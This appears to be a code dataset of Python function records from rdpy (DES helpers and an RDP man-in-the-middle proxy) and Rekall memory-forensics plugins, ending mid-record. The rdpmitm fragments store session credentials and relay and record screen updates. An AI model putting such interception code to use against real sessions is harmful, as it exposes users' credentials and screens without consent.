{"docstring": "\"\"\"Turn the list of bits -> data, into a string\"\"\"\n", "func_signal": "def __BitList_to_String(self, data):\n", "code": "result = []\npos = 0\nc = 0\nwhile pos < len(data):\n    c += data[pos] << (7 - (pos % 8))\n    if (pos % 8) == 7:\n        result.append(c)\n        c = 0\n    pos += 1\n\nif _pythonMajorVersion < 3:\n    return ''.join([ chr(c) for c in result ])\nelse:\n    return bytes(result)", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"Will set the crypting key for this object.\"\"\"\n", "func_signal": "def setKey(self, key):\n", "code": "key = self._guardAgainstUnicode(key)\nself.__key = key", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"\n@summary: Event use to inform bitmap update\n@param destLeft: {int} xmin position\n@param destTop: {int} ymin position\n@param destRight: {int} xmax position because RDP can send bitmap with padding\n@param destBottom: {int} ymax position because RDP can send bitmap with padding\n@param width: {int} width of bitmap\n@param height: {int} height of bitmap\n@param bitsPerPixel: {int} number of bit per pixel\n@param isCompress: {bool} use RLE compression\n@param data: {str} bitmap data\n@see: rdp.RDPClientObserver.onUpdate\n\"\"\"\n", "func_signal": "def onUpdate(self, destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data):\n", "code": "self._server._rss.update(destLeft, destTop, destRight, destBottom, width, height,\n                         bitsPerPixel, rss.UpdateFormat.BMP if isCompress else rss.UpdateFormat.RAW, data)\nself._server._controller.sendUpdate(\n    destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data)", "path": "rdpy/bin/rdpy-rdpmitm.py", "commit_date": "2018-08-06 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"\n@param server: {ProxyServer}\n@param width: {int} screen width\n@param height: {int} screen height\n@param domain: {str} domain session\n@param username: {str} username session\n@param password: {str} password session\n@param security: {str(ssl|rdp)} security level\n\"\"\"\n", "func_signal": "def __init__(self, server, width, height, domain, username, password, security):\n", "code": "self._server = server\nself._width = width\nself._height = height\nself._domain = domain\nself._username = username\nself._password = password\nself._security = security", "path": "rdpy/bin/rdpy-rdpmitm.py", "commit_date": "2018-08-06 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "# Unpad data depending on the mode.\n", "func_signal": "def _unpadData(self, data, pad, padmode):\n", "code": "if not data:\n    return data\nif pad and padmode == PAD_PKCS5:\n    raise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\nif padmode is None:\n    # Get the default padding mode.\n    padmode = self.getPadMode()\n\nif padmode == PAD_NORMAL:\n    if not pad:\n        # Get the default padding.\n        pad = self.getPadding()\n    if pad:\n        data = data[:-self.block_size] + \\\n               data[-self.block_size:].rstrip(pad)\n\nelif padmode == PAD_PKCS5:\n    if _pythonMajorVersion < 3:\n        pad_len = ord(data[-1])\n    else:\n        pad_len = data[-1]\n    data = data[:-pad_len]\n\nreturn data", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\ndata : bytes to be encrypted\npad  : Optional argument for decryption padding. Must only be one byte\npadmode : Optional argument for overriding the padding mode.\n\nThe data must be a multiple of 8 bytes and will be decrypted\nwith the already specified key. In PAD_NORMAL mode, if the\noptional padding character is supplied, then the un-encrypted\ndata will have the padding characters removed from the end of\nthe bytes. This pad removal only occurs on the last 8 bytes of\nthe data (last data block). In PAD_PKCS5 mode, the special\npadding end markers will be removed from the data after\ndecrypting, no pad character is required for PAD_PKCS5.\n\"\"\"\n", "func_signal": "def decrypt(self, data, pad=None, padmode=None):\n", "code": "ENCRYPT = des.ENCRYPT\nDECRYPT = des.DECRYPT\ndata = self._guardAgainstUnicode(data)\nif pad is not None:\n    pad = self._guardAgainstUnicode(pad)\nif self.getMode() == CBC:\n    self.__key1.setIV(self.getIV())\n    self.__key2.setIV(self.getIV())\n    self.__key3.setIV(self.getIV())\n    i = 0\n    result = []\n    while i < len(data):\n        iv = data[i:i+8]\n        block = self.__key3.crypt(iv,    DECRYPT)\n        block = self.__key2.crypt(block, ENCRYPT)\n        block = self.__key1.crypt(block, DECRYPT)\n        self.__key1.setIV(iv)\n        self.__key2.setIV(iv)\n        self.__key3.setIV(iv)\n        result.append(block)\n        i += 8\n    if _pythonMajorVersion < 3:\n        data = ''.join(result)\n    else:\n        data = bytes.fromhex('').join(result)\nelse:\n    data = self.__key3.crypt(data, DECRYPT)\n    data = self.__key2.crypt(data, ENCRYPT)\n    data = self.__key1.crypt(data, DECRYPT)\nreturn self._unpadData(data, pad, padmode)", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"Turn the string data, into a list of bits (1, 0)'s\"\"\"\n", "func_signal": "def __String_to_BitList(self, data):\n", "code": "if _pythonMajorVersion < 3:\n    # Turn the strings into integers. Python 3 uses a bytes\n    # class, which already has this behaviour.\n    data = [ord(c) for c in data]\nl = len(data) * 8\nresult = [0] * l\npos = 0\nfor ch in data:\n    i = 7\n    while i >= 0:\n        if ch & (1 << i) != 0:\n            result[pos] = 1\n        else:\n            result[pos] = 0\n        pos += 1\n        i -= 1\n\nreturn result", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"\nClosure for capability factory\n\"\"\"\n", "func_signal": "def CapabilityFactory():\n", "code": "for c in [GeneralCapability, BitmapCapability, OrderCapability, BitmapCacheCapability, PointerCapability, InputCapability, BrushCapability, GlyphCapability, OffscreenBitmapCacheCapability, VirtualChannelCapability, SoundCapability, ControlCapability, WindowActivationCapability, FontCapability, ColorCacheCapability, ShareCapability, MultiFragmentUpdate]:\n    if self.capabilitySetType.value == c._TYPE_ and (self.lengthCapability.value - 4) > 0:\n        return c(readLen = self.lengthCapability - 4)\nlog.debug(\"unknown Capability type : %s\"%hex(self.capabilitySetType.value))\n#read entire packet\nreturn String(readLen = self.lengthCapability - 4)", "path": "rdpy/rdpy/protocol/rdp/pdu/caps.py", "commit_date": "2015-02-20 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"\n@param target: {tuple(ip, prt)}\n@param privateKeyFilePath: {str} file contain server private key (if none -> back to standard RDP security)\n@param certificateFilePath: {str} file contain server certificate (if none -> back to standard RDP security)\n@param clientSecurity: {str(ssl|rdp)} security layer use in client connection side\n\"\"\"\n", "func_signal": "def __init__(self, target, ouputDir, privateKeyFilePath, certificateFilePath, clientSecurity):\n", "code": "rdp.ServerFactory.__init__(\n    self, 16, privateKeyFilePath, certificateFilePath)\nself._target = target\nself._ouputDir = ouputDir\nself._clientSecurity = clientSecurity\n# use produce unique file by connection\nself._uniqueId = 0", "path": "rdpy/bin/rdpy-rdpmitm.py", "commit_date": "2018-08-06 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"Sets the type of crypting mode, pyDes.ECB or pyDes.CBC\"\"\"\n", "func_signal": "def setMode(self, mode):\n", "code": "_baseDes.setMode(self, mode)\nfor key in (self.__key1, self.__key2, self.__key3):\n    key.setMode(mode)", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"Returns all allocated chunks, no matter to what arena they belong\nor if they are MMAPPED or not.\"\"\"\n\n", "func_signal": "def get_all_allocated_chunks(self):\n", "code": "if self.get_main_arena():\n    for arena in self.arenas:\n        for chunk in self.get_all_allocated_chunks_for_arena(arena):\n            yield chunk\n\nfor chunk in self.get_all_mmapped_chunks():\n    yield chunk", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Creates a dummy arena, initializes relevant variables and manually\nwalks the main heap vma and adds all chunks to the allocated and freed\nchunks lists.\"\"\"\n\n", "func_signal": "def _initialize_dummy_main_arena(self):\n", "code": "self._has_dummy_arena = True\ndummy_arena = self.profile.malloc_state()\n\nself._initialize_arenas(dummy_arena)\n\nmain_arena_range = get_mem_range_for_regex(\n    self.vmas, re.escape(self._main_heap_identifier))\n\n# There might be scenarios in which there is no main heap but only\n# mmapped chunks. In this case, main_arena_range is None.\nif main_arena_range:\n    dummy_arena.system_mem = main_arena_range[1] - main_arena_range[0]\n\n    # we activate chunk preservation (if not prevented via cmdline\n    # option), as we have to walk all chunks at this point anyways\n    self.activate_chunk_preservation()\n\n    if self._preserve_chunks:\n        dummy_arena.allocated_chunks = list()\n\n    curr_chunk = None\n    # while there will be no freed chunk to gather, we still test for\n    # it as we need to walk the chunks anyways to get to the top chunk\n    for next_chunk in dummy_arena.first_chunk.next_chunk_generator():\n        if not curr_chunk:\n            curr_chunk = next_chunk\n            self._check_and_report_chunksize(curr_chunk,\n                                             main_arena_range[1])\n            continue\n\n        if (curr_chunk.v() + curr_chunk.chunksize()) \\\n                == main_arena_range[1] and curr_chunk.get_size() > 0x0:\n            # we hit top chunk\n            curr_chunk.is_top_chunk = True\n            dummy_arena.top_chunk = curr_chunk\n\n            break\n\n        if not self._check_and_report_chunksize(next_chunk,\n                                                main_arena_range[1]):\n            self.session.logging.warn(\n                \"Seems like we are not walking a valid glibc heap, so \"\n                \"we are stopping right now.\")\n            break\n\n        is_in_use = next_chunk.prev_inuse()\n\n        if (curr_chunk.v() + curr_chunk.chunksize()) \\\n                < main_arena_range[1] and not is_in_use:\n\n            curr_chunk.is_bin_chunk = True\n            dummy_arena.freed_chunks.append(curr_chunk)\n\n        elif self._preserve_chunks:\n            dummy_arena.allocated_chunks.append(curr_chunk)\n\n        curr_chunk = next_chunk\n\n    if dummy_arena.top_chunk:\n        end = dummy_arena.top_chunk.v() \\\n            + dummy_arena.top_chunk.chunksize()\n        if dummy_arena.system_mem != end - main_arena_range[0]:\n            self.session.logging.warn(\n                \"Unexpected mismatch: memory range for main heap \"\n                \"is not equal to the range calculated with the top \"\n                \"chunk. This is unexpected, indicates a problem and \"\n                \"will most probably lead to unreliable results.\")", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"initializes the process address space and malloc_par struct and\ncalls initialize_*. Should be the first method to be called for each\ntask.\nReturns True if everything seems to be gone fine.\"\"\"\n\n", "func_signal": "def init_for_task(self, task):\n", "code": "self._reset()\n\n# processes normally have an associated mm_struct/memory descriptor\n# if there is none, it is probably a kernel thread\nif task.mm.dereference():\n\n    self.task = task\n    self.process_as = task.get_process_address_space()\n    self.vmas = self._get_vmas_for_task(task)\n\n    if self.vmas:\n        self._load_libc_profile()\n\n        if self._libc_profile_success:\n\n            # as these values are used on various locations,\n            # we gather them only once\n            self._chunk_fd_member_offset =  \\\n                self.profile.get_obj_offset(\"malloc_chunk\", \"fd\")\n            self._pointer_size = self.profile.get_obj_size(\"Pointer\")\n\n            libc_range = get_libc_range(self.vmas)\n            if libc_range:\n                self._libc_offset = libc_range[0]\n                self.session.logging.info(\n                    \"Found libc offset at: \" + hex(self._libc_offset))\n\n            if not self._libc_offset:\n                # might be a statically linked executable\n                self.session.logging.info(\n                    \"Didn't find the libc filename in the vm_areas of \"\n                    \"the current process: {:d} - {:s} . The reason \"\n                    \"might be a statically linked binary or an \"\n                    \"unexpected error. We try to fix this issue for \"\n                    \"the first case. Without any follow up warnings, \"\n                    \"everything seems to be fine.\"\n                    .format(self.task.pid, repr(self.task.comm.v())))\n\n                self._is_probably_static_bin = True\n\n            pot_main_arena = None\n\n            if self.plugin_args.main_arena:\n                main_arena_offset = self.plugin_args.main_arena\n\n            else:\n                main_arena_offset = self.profile.get_constant(\n                    'main_arena')\n\n            if main_arena_offset:\n                if self._libc_offset:\n                    main_arena_offset += self._libc_offset\n\n                pot_main_arena = self.profile.malloc_state(\n                    offset=(main_arena_offset), profile=self.profile,\n                    vm=self.process_as)\n\n            else:\n                self.session.logging.info(\n                    \"As it seems like we don't have debug information \"\n                    \"for the main arena, we now try to retrieve the \"\n                    \"main_arena via some different techniques for pid \"\n                    \"{:d}.\".format(self.task.pid))\n                pot_main_arena = self._carve_main_arena()\n\n                if not pot_main_arena and \\\n                        self._test_and_load_special_glibc_profile(\n                                pot_main_arena):\n                    # We redefined the malloc_state struct and with\n                    # this new struct, we search for the main_arena\n                    # again. See _test__load_special_glibc_profile for\n                    # further comments\n                    pot_main_arena = self._carve_main_arena()\n\n                if not pot_main_arena:\n                    # This will most probably only happen, if the page\n                    # containing the main arena has been swapped\n                    self.session.logging.warn(\n                        \"We were not able to find the main arena for \"\n                        \"task {0:d} and since we have no debug \"\n                        \"information about its offset, we can't \"\n                        \"retrieve it directly.\".format(self.task.pid))\n\n            pot_main_arena = \\\n                self._initialize_internal_structs_and_values(\n                    main_arena=pot_main_arena)\n\n            if pot_main_arena:\n                if self._test_and_load_special_glibc_profile(\n                        pot_main_arena):\n                    # seems like the malloc_state definition has been\n                    # changed (see _test__load_special_glibc_profile\n                    # for further comments), so we reinitialize our\n                    # arena\n                    offset = pot_main_arena.v()\n                    if not self.plugin_args.main_arena and \\\n                            self._carve_method in \\\n                            ['top_chunk', 'freed_chunk']:\n                        # If the absolute offset for the main_arena\n                        # has been given, we don't touch the offset.\n                        # If not, and the main_arena has been gathered\n                        # via the top chunk, we subtract 8 bytes from\n                        # the previous offset, since this offset has\n                        # been calculated with a wrong 'top' offset\n                        # within the malloc state struct (the\n                        # additional have_fastchunks field lies before\n                        # the top chunk).\n                        offset -= 8\n\n                    pot_main_arena = self.profile.malloc_state(\n                        offset=offset, vm=self.process_as)\n\n                    pot_main_arena = \\\n                        self._initialize_internal_structs_and_values(\n                            main_arena=pot_main_arena)\n\n                if self._check_arenas(pot_main_arena) is False:\n                    self.session.logging.warn(\n                        \"Arena pointers don't seem to loop within the \"\n                        \"expected range. Maybe the main_arena pointer \"\n                        \"is wrong. This might lead to unreliable \"\n                        \"results.\")\n\n                # despite potential problems, we try to proceed\n                self._initialize_arenas(pot_main_arena)\n\n                self._mark_heap_vm_areas()\n\n                self._check_heap_consistency()\n\n                self._initialize_heap_first_chunks()\n                self._check_and_correct_empty_space_in_heaps()\n\n            else:\n                # no main_arena could be found, so we simply walk\n                # the main_heap for chunks\n                self.session.logging.warn(\n                    \"No main_arena could be found, so we simply try to\"\n                    \" walk the chunks in the main heap. Without the \"\n                    \"arena, fastbin chunks can't be recognized \"\n                    \"reliably, and hence are treated as allocated \"\n                    \"chunks. This is especially a problem on further \"\n                    \"analysis (e.g. dumping their content).\")\n\n                self._initialize_dummy_main_arena()\n\n            self._initialize_tcache_bins()\n            self._initialize_mmapped_first_chunks()\n            self._initialize_heap_vma_list()\n            self.activate_chunk_preservation()\n            self.check_and_report_size_inconsistencies()\n\n            return True\n\n        else:\n            self.session.logging.error(\n                \"Libc profile is not loaded, \"\n                \"hence no struct or constant information. Aborting\")\n\n    else:\n        self.session.logging.warn(\n            \"No vm_areas could be extracted from current task (maybe \"\n            \"kernel thread): {:s} (PID: {:d})\"\n            .format(repr(task.comm.v()), task.pid))\n\nelse:\n    self.session.logging.warn(\n        \"Current task seems to be a kernel thread. Skipping Task: \"\n        \"{:s} (PID: {:d})\".format(repr(task.comm.v()), task.pid))\n\nself._reset()\n\nreturn False", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Used for _get_task_pt_regs\"\"\"\n# taken from arch/x86/include/asm/page_64_types.h\n", "func_signal": "def _get_pt_regs_offset(self):\n", "code": "TOP_OF_KERNEL_STACK_PADDING = 0\n\nif self.session.profile.get_kernel_config('CONFIG_X86_32'):\n    if self.session.profile.get_kernel_config('CONFIG_VM86'):\n        TOP_OF_KERNEL_STACK_PADDING = 16\n    else:\n        TOP_OF_KERNEL_STACK_PADDING = 8\n\nif self.session.profile.get_kernel_config(\"CONFIG_KASAN\"):\n    KASAN_STACK_ORDER = 1\nelse:\n    KASAN_STACK_ORDER = 0\n\nif self.session.profile.metadata(\"arch\") == 'AMD64':\n    THREAD_SIZE_ORDER = 2 + KASAN_STACK_ORDER\nelse:\n    THREAD_SIZE_ORDER = 1\n\nTHREAD_SIZE = self._min_pagesize << THREAD_SIZE_ORDER\nreturn THREAD_SIZE - TOP_OF_KERNEL_STACK_PADDING", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Sets the class attribute self.statistics with a dict containing\ne.g. number of allocated/freed/fastbin/tcache chunks, their sizes...\"\"\"\n\n", "func_signal": "def _calculate_statistics(self):\n", "code": "if not self.get_main_arena():\n    return\n\nnumber_of_arenas = len(self.arenas)\nnumber_of_heaps = 0\n\nnumber_of_bin_chunks = 0\nsize_of_bin_chunks = 0\nnumber_of_fastbin_chunks = 0\nsize_of_fastbin_chunks = 0\nnumber_of_tcache_chunks = 0\nsize_of_tcache_chunks = 0\nnumber_of_top_chunks = 0\nsize_of_top_chunks = 0\n\nnumber_of_main_chunks = 0\nsize_of_main_chunks = 0\n\n# both bottom chunks are excluded here\nnumber_of_thread_chunks = 0\nsize_of_thread_chunks = 0\n\nnumber_of_bottom_chunks = 0\nsize_of_bottom_chunks = 0\n\n##### mallinfo specific values ####\n# includes bin and top chunks, also for empty main arena\nmallinfo_number_of_free_chunks = 0\n# does not include tcache chunks\nmallinfo_total_free_space = 0\n# tcache chunks are added up here for mallinfo output\nmallinfo_total_allocated_space = 0\n\n# the sum of the system_mem fields from all arenas\nnon_mmapped_bytes = 0\n\n# total_allocated_space is the sum of all allocated chunk sizes\n# _except_ mmapped chunks\n# includes also heap/arena struct sizes and bottom chunks\ntotal_allocated_space = 0\n\n# includes top chunk, tcache and fastbins\ntotal_free_space = 0\n####################################\n\nfor arena in self.arenas:\n\n    non_mmapped_bytes += arena.system_mem\n\n    if arena.top_chunk:\n        number_of_top_chunks += 1\n        size_of_top_chunks += arena.top_chunk.chunksize()\n\n    # mallinfo always counts the top chunk for the main arena, even if\n    # the main heap and hence the top chunk doesn't exist (in these\n    # cases, the top chunk pointer points to the top member of the\n    # malloc_state struct: to itself)\n    elif arena.is_main_arena:\n        mallinfo_number_of_free_chunks += 1\n\n    for chunk in arena.freed_fast_chunks:\n        number_of_fastbin_chunks += 1\n        size_of_fastbin_chunks += chunk.chunksize()\n\n    for chunk in arena.freed_tcache_chunks:\n        number_of_tcache_chunks += 1\n        size_of_tcache_chunks += chunk.chunksize()\n\n    for chunk in arena.freed_chunks:\n        number_of_bin_chunks += 1\n        size_of_bin_chunks += chunk.chunksize()\n\n    if arena.is_main_arena:\n        for chunk in self._allocated_chunks_for_main_arena():\n            number_of_main_chunks += 1\n            size_of_main_chunks += chunk.chunksize()\n\n    else:\n        for chunk in self._allocated_chunks_for_thread_arena(arena):\n\n            # The last bottom chunk has a size of 0 but in fact takes\n            # 2 * size_sz. As it normally isn't returned by\n            # allocated_chunks_for_thread_arena, and has a chunksize\n            # of 0, we manually add it's size\n            if chunk.is_bottom_chunk:\n                number_of_bottom_chunks += 2\n                size_of_bottom_chunks += chunk.chunksize()\n                size_of_bottom_chunks += self._size_sz * 2\n\n            else:\n                size_of_thread_chunks += chunk.chunksize()\n                number_of_thread_chunks += 1\n\n        # total_allocated_space includes also the allocated space from\n        # heap_info and malloc_state structs (except for the\n        # main_arena)\n        for heap in arena.heaps:\n            number_of_heaps += 1\n            total_allocated_space += heap.first_chunk.v() - heap.v()\n\n### mallinfo specific calculation\ntotal_free_space += size_of_top_chunks\ntotal_free_space += size_of_fastbin_chunks\ntotal_free_space += size_of_tcache_chunks\ntotal_free_space += size_of_bin_chunks\n\nmallinfo_total_free_space += size_of_top_chunks\nmallinfo_total_free_space += size_of_fastbin_chunks\nmallinfo_total_free_space += size_of_bin_chunks\n\nmallinfo_number_of_free_chunks += number_of_bin_chunks\nmallinfo_number_of_free_chunks += number_of_top_chunks\n\ntotal_allocated_space += size_of_main_chunks\ntotal_allocated_space += size_of_thread_chunks\ntotal_allocated_space += size_of_bottom_chunks\n\nmallinfo_total_allocated_space = total_allocated_space\nmallinfo_total_allocated_space += size_of_tcache_chunks\n# includes the gaps after bottom chunks (caused by different\n# MALLOC_ALIGNMENT) and in front of the first main_arena chunk\nmallinfo_total_allocated_space += sum(list(\n    self._bottom_chunk_gaps.values()))\nif self.get_main_arena().first_chunk:\n    mallinfo_total_allocated_space += self._front_misalign_correction\n######################\n\nstatistics = dict()\nstatistics['number_of_arenas'] = number_of_arenas\nstatistics['number_of_heaps'] = number_of_heaps\nstatistics['number_of_bin_chunks'] = number_of_bin_chunks\nstatistics['size_of_bin_chunks'] = size_of_bin_chunks\nstatistics['number_of_fastbin_chunks'] = number_of_fastbin_chunks\nstatistics['size_of_fastbin_chunks'] = size_of_fastbin_chunks\nstatistics['number_of_tcache_chunks'] = number_of_tcache_chunks\nstatistics['size_of_tcache_chunks'] = size_of_tcache_chunks\nstatistics['number_of_top_chunks'] = number_of_top_chunks\nstatistics['size_of_top_chunks'] = size_of_top_chunks\nstatistics['number_of_main_chunks'] = number_of_main_chunks\nstatistics['size_of_main_chunks'] = size_of_main_chunks\nstatistics['number_of_thread_chunks'] = number_of_thread_chunks\nstatistics['size_of_thread_chunks'] = size_of_thread_chunks\nstatistics['number_of_bottom_chunks'] = number_of_bottom_chunks\nstatistics['size_of_bottom_chunks'] = size_of_bottom_chunks\n\nstatistics['non_mmapped_bytes'] = non_mmapped_bytes\nstatistics['total_allocated_space'] = total_allocated_space\nstatistics['mallinfo_total_allocated_space'] = \\\n    mallinfo_total_allocated_space\nstatistics['total_free_space'] = total_free_space\nstatistics['mallinfo_total_free_space'] = mallinfo_total_free_space\nstatistics['mallinfo_number_of_free_chunks'] = \\\n    mallinfo_number_of_free_chunks\n\nself.statistics = statistics\n\nself._calculate_mmapped_statistics()", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Find the right subsection object for this pte.\"\"\"\n# Try to find the subsection by looking it up from the list of known\n# subsections.\n", "func_signal": "def get_subsection(self):\n", "code": "subsection_lookup = self.session.GetParameter(\n    \"prototype_pte_array_subsection_lookup\")\n\nstart, _, subsection_offset = subsection_lookup.get_containing_range(\n    self.pte_address)\n\nif start:\n    return self.session.profile._SUBSECTION(subsection_offset)\n\nif self.original_pte is not None:\n    return self.original_pte.u.Subsect.Subsection", "path": "rekall/rekall-core/rekall/plugins/windows/pagefile.py", "commit_date": "2020-01-19 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Map the subsection into the physical address space.\n\nis_address specifies whether subsection_pte is the address of the pte\nor its value (true means it is the address)\n\nReturns:\n  The offset in the physical AS where this subsection PTE is mapped to.\n\"\"\"\n", "func_signal": "def _get_subsection_mapped_address(self, subsection_pte, is_address=True):\n", "code": "if self.base_as_can_map_files:\n    if is_address:\n        pte = self.session.profile._MMPTE(subsection_pte)\n    else:\n        pte = self.session.profile._MMPTE()\n        pte.u.Long = subsection_pte\n\n    subsection = pte.u.Subsect.Subsection\n    subsection_base = subsection.SubsectionBase.v()\n\n    filename = subsection.ControlArea.FilePointer.file_name_with_drive()\n    if filename:\n        # The offset within the file starts at the beginning sector of\n        # the section object, plus one page for each PTE. A section\n        # object has an array of PTEs - the first one is 0 pages from\n        # the start of the section, and each other PTE is another page\n        # into the file. So we calculate the total number of pages from\n        # the array index of the subsection_pte_address that we were\n        # given.\n        file_offset = (\n            (subsection_pte -\n             subsection_base) * 0x1000 / pte.obj_size +\n            subsection.StartingSector * 512)\n\n        return self.base.get_mapped_offset(filename, file_offset)", "path": "rekall/rekall-core/rekall/plugins/windows/pagefile.py", "commit_date": "2020-01-19 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Marks all vm_areas containing known heap_info structs with\n'_heap_vma_identifier'. This flag is required by other functions.\nThe marking process is normally done automatically in the function\n_get_vmas_for_task, but in the case where no offset for the main arena\nand no main heap is present, this step fails.\"\"\"\n\n", "func_signal": "def _mark_heap_vm_areas(self):\n", "code": "known_heaps = [heap for arenas in self.arenas for heap in arenas.heaps]\n\nfor heap in known_heaps:\n    vma = get_vma_for_offset(self.vmas, heap.v())\n    if vma:\n        vm_data = vma[2]\n        vm_data['name'] = self._heap_vma_identifier\n        self.vmas.insert(vma[0], vma[1], vm_data)", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Gets the final physical address from the PTE value.\"\"\"\n", "func_signal": "def _get_phys_addr_from_pte(self, vaddr, pte_value):\n", "code": "collection = intel.PhysicalAddressDescriptorCollector(self.session)\nself.describe_pte(collection, None, pte_value, vaddr)\nreturn collection.physical_address", "path": "rekall/rekall-core/rekall/plugins/windows/pagefile.py", "commit_date": "2020-01-19 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Returns true if the given offset resides in a vma potentially\nbelonging to the heap. This function is only used while carving for\nthe main arena and hence can not use the later on generated internal\nheap_vmas list.\"\"\"\n\n", "func_signal": "def _offset_in_heap_range(self, offset):\n", "code": "for vm_start, vm_end, vm_data in self.vmas:\n    if vm_start <= offset < vm_end:\n        name = vm_data['name']\n        if name == self._main_heap_identifier \\\n                or name == self._heap_vma_identifier:\n            return True\n\nreturn False", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Returns a list with identifier and vm_area that given offset belongs to.\nExpects the output from _get_vmas_for_task as argument.\n\"\"\"\n\n", "func_signal": "def get_vma_for_offset(vmas, offset):\n", "code": "vma = vmas.get_containing_range(offset)\nreturn None if vma[0] == None else vma", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Initializes the malloc_par struct.\"\"\"\n\n", "func_signal": "def _initialize_malloc_par(self, main_arena=None):\n", "code": "mp_offset = None\nabsolute_offset = None\n\nif self.mp_offset:\n    mp_offset = self.mp_offset\n\nelse:\n    self.mp_offset = self.profile.get_constant('mp_')\n    mp_offset = self.mp_offset\n\nif mp_offset:\n    if self._libc_offset:\n        absolute_offset = self._libc_offset + mp_offset\n\n    # for statically linked binaries, there is no libc vma\n    else:\n        absolute_offset = mp_offset\n\nif not absolute_offset and \\\n        [x for x in self.vmas if x[2]['name'] ==\n            self._main_heap_identifier]:\n    # either mp_ offset hasn't given on the cmd line and/or the libc\n    # couldn't be found (maybe because it's a statically linked binary\n    # so we try to find it manually (doesn't currently work for\n    # statically linked binaries)\n    main_arena_range = get_mem_range_for_regex(\n        self.vmas, re.escape(self._main_heap_identifier))\n\n    sbrk_base_offset = self.profile.get_obj_offset(\"malloc_par\",\n                                                   \"sbrk_base\")\n\n    hits = None\n    if self._is_probably_static_bin:\n        # If the binary has been linked statically, main_arena and\n        # malloc_par are located in the binary.\n        # In this case, mp_.sbrk_base points not at the beginning of\n        # the main heap but somewhere behind, so we try to find\n        # pointers somewhere in this space and hope we get not too many\n        # ;-)\n        vmas = [x for x in self.vmas if x[2]['is_file']]\n        # The upper limit is chosen based on past experience.\n        # It is the maximum amount of bytes to walk from the beginning\n        # of the the main heap area.\n        upper_search_limit = int(\\\n            self._min_pagesize * self._pointer_size / 4)\n        pointers = [x+main_arena_range[0] for x in\n                    list(range(0, upper_search_limit, 8))]\n\n        hits = self.search_vmas_for_needle(\n            pointers=pointers, vmas=vmas)\n\n    else:\n        hits = self.search_vmas_for_needle(\n            pointers=[main_arena_range[0]], vma_regex=_LIBC_REGEX)\n\n    # if there are more than one hit, we try to filter out all false\n    # positives\n    mp_candidates = []\n    if hits and len(hits) >= 2:\n        top_offset = self.profile.get_obj_offset(\"malloc_state\", \"top\")\n        for hit in hits:\n            # One test to find a FP hit is to test against main_arena.\n            # This case happens, if no chunk has been yet allocated in\n            # the main arena, so the main heap is empty and the 